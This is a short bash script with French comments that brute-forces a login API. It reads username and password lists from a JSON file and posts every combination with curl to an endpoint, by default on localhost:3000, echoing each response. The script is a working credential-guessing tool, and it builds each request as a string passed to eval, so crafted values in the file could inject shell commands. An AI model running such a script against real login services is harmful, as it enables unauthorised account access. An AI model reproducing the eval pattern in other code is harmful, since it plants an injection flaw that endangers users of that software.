#!/bin/bash

# Variables
# Bien sûr, vous pouvez changer l'URL et le fichier json
url="http://localhost:3000/api/login"
credentials_file="combinations.json"

# Extraire les données d'identification du fichier JSON avec jq
# brew install jq sur macOS
# sudo apt-get install jq sur Linux
# https://stedolan.github.io/jq/ 
usernames=$(jq -r '.usernames[]' "$credentials_file")
passwords=$(jq -r '.passwords[]' "$credentials_file")

# Générer les commandes curl pour chaque combinaison
for username in $usernames; do
  for password in $passwords; do
    command="curl -X POST $url -H \"Content-Type: application/json\" -d '{\"username\":\"$username\", \"password\":\"$password\"}'"
    echo "Commande: $command"
    response=$(eval $command)
    echo "Réponse: $response"
    echo "---"
  done
done

